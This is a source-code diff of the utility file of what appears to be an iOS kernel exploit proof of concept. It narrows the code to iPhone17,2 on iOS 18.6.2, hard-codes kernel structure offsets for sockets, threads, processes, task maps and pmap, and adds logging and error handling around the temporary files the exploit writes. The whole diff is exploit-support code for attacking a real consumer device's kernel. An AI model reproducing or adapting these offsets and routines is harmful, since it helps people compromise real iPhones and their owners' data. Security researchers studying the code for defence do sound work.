@@ -1,12 +1,34 @@
 #include "utils.h"
 
 #include <fcntl.h>
+#include <stdarg.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/sysctl.h>
 #include <sys/utsname.h>
 #include <unistd.h>
+
+static poc_log_handler_t g_log_handler;
+
+void poc_set_log_handler(poc_log_handler_t handler) {
+    g_log_handler = handler;
+}
+
+void poc_log(const char* prefix, const char* format, ...) {
+    char message[1024];
+    va_list args;
+    va_start(args, format);
+    vsnprintf(message, sizeof(message), format, args);
+    va_end(args);
+
+    fprintf(stderr, "%s%s\n", prefix, message);
+    if (g_log_handler) {
+        char line[1100];
+        snprintf(line, sizeof(line), "%s%s", prefix, message);
+        g_log_handler(line);
+    }
+}
 
 void* reverse_memmem(const void* haystack, size_t haystack_len, const void* needle, size_t needle_len) {
     if (needle_len == 0) return (void*)haystack;
@@ -25,83 +47,38 @@ void* reverse_memmem(const void* haystack, size_t haystack_len, const void* need
     return NULL;
 }
 
-void hexdump(const void* data, size_t size) {
-    char ascii[17];
-    size_t i, j;
-    ascii[16] = '\0';
-    for (i = 0; i < size; ++i) {
-        printf("%02X ", ((unsigned char*)data)[i]);
-        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
-            ascii[i % 16] = ((unsigned char*)data)[i];
-        } else {
-            ascii[i % 16] = '.';
-        }
-        if ((i + 1) % 8 == 0 || i + 1 == size) {
-            printf(" ");
-            if ((i + 1) % 16 == 0) {
-                printf("|  %s \n", ascii);
-            } else if (i + 1 == size) {
-                ascii[(i + 1) % 16] = '\0';
-                if ((i + 1) % 16 <= 8) {
-                    printf(" ");
-                }
-                for (j = (i + 1) % 16; j < 16; ++j) {
-                    printf("   ");
-                }
-                printf("|  %s \n", ascii);
-            }
-        }
-    }
-}
-
-// thanks wh1te4ver for offsets
 int offsets_init(void) {
     char version[32] = {};
+    char build[32] = {};
     size_t version_len = sizeof(version);
-    sysctlbyname("kern.osproductversion", version, &version_len, NULL, 0);
+    size_t build_len = sizeof(build);
+    if (sysctlbyname("kern.osproductversion", version, &version_len, NULL, 0) != 0 || sysctlbyname("kern.osversion", build, &build_len, NULL, 0) != 0) {
+        LOG_ERR("failed to read OS version");
+        return -1;
+    }
 
-    sscanf(version, "%d.%d", &g_offsets.ios_major_version, &g_offsets.ios_minor_version);
-    LOG("Running on iOS %s", version);
+    const char* machine = get_device_machine();
+    LOG("target: %s, iOS %s (%s)", machine, version, build);
+    if (strcmp(machine, TARGET_DEVICE) != 0 || strcmp(version, TARGET_VERSION) != 0 || strcmp(build, TARGET_BUILD) != 0) {
+        LOG_ERR("supported target is %s on iOS %s (%s)", TARGET_DEVICE, TARGET_VERSION, TARGET_BUILD);
+        return -1;
+    }
 
-    // same for all
+    // Fixed offsets for iPhone17,2 on 18.6.2 (22G100).
+    g_offsets.inpcb_inp_list_le_next = 0x20;
+    g_offsets.inpcb_inp_pcbinfo = 0x38;
     g_offsets.inpcb_inp_socket = 0x40;
+    g_offsets.inpcb_icmp6filt = 0x148;
+    g_offsets.inpcbinfo_ipi_zone = 0x68;
+    g_offsets.zone_view_name = 0x10;
+    g_offsets.socket_so_count = 0x254;
+    g_offsets.socket_so_background_thread = 0x2b0;
+    g_offsets.thread_t_ro = 0x3f0;
+    g_offsets.thread_ro_proc = 0x18;
     g_offsets.proc_p_ro = 0x18;
     g_offsets.proc_ro_task = 0x8;
     g_offsets.task_map = 0x28;
-    if (OS_VERSION_AT_LEAST(26, 1)) {
-        LOG_ERR("Unsupported version: %s", version);
-        return -1;
-    } else if (OS_VERSION_AT_LEAST(26, 0)) {
-        g_offsets.inpcb_icmp6filt = 0x148;
-        g_offsets.socket_so_count = 0x23c;
-        g_offsets.socket_so_background_thread = 0x298;
-        g_offsets.thread_t_ro = 0x390;  // TODO: this changes a lot and with different devices
-        g_offsets.thread_ro_proc = 0x18;
-    } else if (OS_VERSION_AT_LEAST(18, 0)) {
-        g_offsets.inpcb_icmp6filt = 0x148;
-        g_offsets.socket_so_count = 0x254;
-        g_offsets.socket_so_background_thread = 0x2b0;
-        g_offsets.thread_t_ro = 0x378;  // TODO: this changes with 18.1, 18.4, 18.6 and different devices
-        g_offsets.thread_ro_proc = 0x18;
-    } else if (OS_VERSION_AT_LEAST(17, 4)) {
-        g_offsets.inpcb_icmp6filt = 0x148;
-        g_offsets.socket_so_count = 0x254;
-        g_offsets.socket_so_background_thread = 0x2b0;
-        g_offsets.thread_t_ro = 0x3a0;  // TODO: this changes a lot and with different devices
-        g_offsets.thread_ro_proc = 0x18;
-    } else if (OS_VERSION_AT_LEAST(17, 1)) {
-        g_offsets.inpcb_icmp6filt = 0x148;
-        g_offsets.socket_so_count = 0x24c;
-        g_offsets.socket_so_background_thread = 0x2a8;
-        g_offsets.thread_t_ro = 0x368;  // TODO: this changes a lot and with different devices
-        g_offsets.thread_ro_proc = 0x18;
-    } else {
-        g_offsets.inpcb_icmp6filt = 0x150;
-        g_offsets.socket_so_count = 0x22c;
-        g_offsets.socket_so_background_thread = 0x288;  // TODO: check
-        g_offsets.thread_t_ro = 0x358;                  // TODO: this changes a lot and with different devices
-        g_offsets.thread_ro_proc = 0x10;
-    }
+    g_offsets.map_pmap = 0x40;
     return 0;
 }
 
@@ -118,11 +95,13 @@ char* get_device_machine(void) {
     return g_ctx.device_machine;
 }
 
-static void create_target_file(char* path) {
+static bool create_target_file(char* path) {
     FILE* fp = fopen(path, "wb");
+    if (fp == NULL) return false;
     // default_file_content is set to random marker
-    fwrite(g_ctx.default_file_content, 1, g_ctx.target_file_size, fp);
+    bool ok = fwrite(g_ctx.default_file_content, 1, g_ctx.target_file_size, fp) == g_ctx.target_file_size;
     fclose(fp);
+    return ok;
 }
 
 void init_target_file(void) {
@@ -135,8 +114,11 @@ void init_target_file(void) {
     snprintf(g_ctx.write_file_path + strlen(g_ctx.write_file_path), sizeof(g_ctx.write_file_path) - strlen(g_ctx.write_file_path), "/%08x", arc4random());
 
     // creates file at temp
-    create_target_file(g_ctx.read_file_path);
-    create_target_file(g_ctx.write_file_path);
+    if (!create_target_file(g_ctx.read_file_path) || !create_target_file(g_ctx.write_file_path)) {
+        g_ctx.read_fd = -1;
+        g_ctx.write_fd = -1;
+        return;
+    }
 
     g_ctx.read_fd = open(g_ctx.read_file_path, O_RDWR);
     g_ctx.write_fd = open(g_ctx.write_file_path, O_RDWR);
